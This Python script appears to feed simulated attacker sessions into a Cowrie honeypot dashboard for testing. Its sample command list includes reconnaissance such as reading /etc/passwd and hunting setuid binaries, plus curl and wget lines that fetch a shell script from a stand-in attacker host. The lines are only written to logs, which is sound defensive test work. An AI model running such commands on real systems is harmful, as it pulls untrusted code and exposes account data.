"""Pump fake scalpel + cowrie events so you can test the dashboard without
running the full honeypot.

Usage:
    python -m scalpel.dashboard.simulate
"""
import json, random, time
from pathlib import Path

_REPO = Path(__file__).resolve().parents[2]
_SCALPEL = _REPO / "var" / "log" / "cowrie" / "scalpel.jsonl"
_COWRIE  = _REPO / "var" / "log" / "cowrie" / "cowrie.json"

_CMDS = [
    ("uname -a",                    1, 0.3),
    ("cat /etc/os-release",         1, 0.2),
    ("id",                          1, 0.1),
    ("whoami",                      1, 0.1),
    ("df -h",                       1, 0.4),
    ("free -m",                     2, 800),
    ("uptime",                      2, 750),
    ("ps aux | grep root",          3, 320),
    ("cat /etc/passwd | head -20",  3, 410),
    ("find / -perm -4000 2>/dev/null", 3, 550),
    ("curl http://10.0.0.1/shell.sh", 3, 480),
    ("wget -O- http://evil.example/x", 3, 390),
]

IPS = ["192.168.1.42", "10.10.14.7", "172.16.0.55"]

def _write(path: Path, obj: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a") as f:
        f.write(json.dumps(obj) + "\n")

def main() -> None:
    print("Simulating events → open http://localhost:8765")
    session_id = "aabbccdd1122"

    # Send a session connect + login
    _write(_COWRIE, {"eventid": "cowrie.session.connect", "src_ip": IPS[0], "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")})
    _write(_COWRIE, {"eventid": "cowrie.login.success",  "src_ip": IPS[0], "username": "root", "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")})
    time.sleep(0.5)

    while True:
        cmd, tier, base_lat = random.choice(_CMDS)
        lat = round(base_lat * random.uniform(0.8, 1.3), 2)
        _write(_SCALPEL, {
            "ts": time.time(),
            "tier": tier,
            "cmd": cmd,
            "latency_ms": lat,
            "session_id": session_id,
            "outcome": "ok",
        })
        print(f"  T{tier}  {lat:>7.1f}ms  {cmd}")
        time.sleep(random.uniform(0.5, 2.0))

if __name__ == "__main__":
    main()
